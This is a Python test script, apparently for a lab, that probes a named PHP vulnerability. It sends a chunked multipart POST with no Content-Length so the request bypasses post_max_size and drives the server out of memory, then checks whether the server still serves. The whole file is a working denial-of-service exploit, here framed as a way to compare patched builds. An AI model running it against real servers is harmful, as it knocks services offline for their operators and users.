#!/usr/bin/env python3
"""CVE-2026-109618 OOM probe against the blog lab (self-contained).

Sends a chunked multipart body with no Content-Length, so post_max_size is
bypassed and the multipart parser keeps allocating until memory_limit is hit.
Reports the observable outcome, which is what differs between builds:

  exit 1    -> PHP hard-exited (our `_exit(1)` safe-error path)
  exit 255  -> PHP ran its normal shutdown on the OOM path
  hung      -> process alive but not serving (baseline: server loop wedged)

Exit codes: 0 probe ran, 1 usage/connection problem.
"""
import argparse
import socket
import sys
import time
import urllib.error
import urllib.request

BOUNDARY = "BLOGOOM"


def health(url: str, timeout: float = 3.0):
    try:
        with urllib.request.urlopen(f"{url}/?action=health", timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace").strip()
    except urllib.error.HTTPError as exc:
        return exc.code, ""
    except Exception:
        return None, ""


def send_oom(host: str, port: int, path: str, fields: int, size: int) -> str:
    """Chunked multipart: no Content-Length, so post_max_size does not apply."""
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    def chunks():
        # Distinct field names: identical names overwrite instead of accumulating.
        for i in range(fields):
            yield (
                f"--{BOUNDARY}\r\n"
                f'Content-Disposition: form-data; name="f{i}"\r\n\r\n'
            ).encode() + b"A" * size + b"\r\n"
        yield f"--{BOUNDARY}--\r\n".encode()

    sock = socket.create_connection((host, port), timeout=30)
    sock.sendall(header)
    try:
        for chunk in chunks():
            sock.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        sock.sendall(b"0\r\n\r\n")
    except (BrokenPipeError, ConnectionResetError) as exc:
        return f"<connection dropped mid-send: {type(exc).__name__}>"

    sock.settimeout(20)
    resp = b""
    while True:
        try:
            data = sock.recv(65536)
        except (socket.timeout, ConnectionResetError):
            break
        if not data:
            break
        resp += data
    sock.close()
    return resp.decode("latin1", "replace")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8054")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--fields", type=int, default=400)
    ap.add_argument("--size", type=int, default=100 * 1024)
    ap.add_argument("--recover-wait", type=float, default=2.0)
    args = ap.parse_args()

    host, _, port = args.url.split("//", 1)[1].partition(":")
    port = int(port.split("/")[0] or 80)

    before = health(args.url)
    print(f"before : {before[0]} {before[1]}")
    if before[0] is None:
        print("FAIL: server not reachable before probe", file=sys.stderr)
        return 1

    total = args.fields * args.size
    print(f"sending: {args.fields} fields x {args.size}B = {total // 1024 // 1024}MiB, chunked")

    body = send_oom(host, port, args.path, args.fields, args.size)
    status = body.split("\r\n", 1)[0] if body else "<no response>"
    print(f"status : {status}")
    if "memory" in body.lower():
        print("         (OOM message in response body)")
    elif body:
        print(f"         body: {body[:160]!r}")

    time.sleep(args.recover_wait)
    after = health(args.url)
    print(f"after  : {after[0]} {after[1] or '<not serving>'}")
    print(f"verdict: {'STILL SERVING (OOM not reached)' if after[0] else 'NOT SERVING after OOM'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
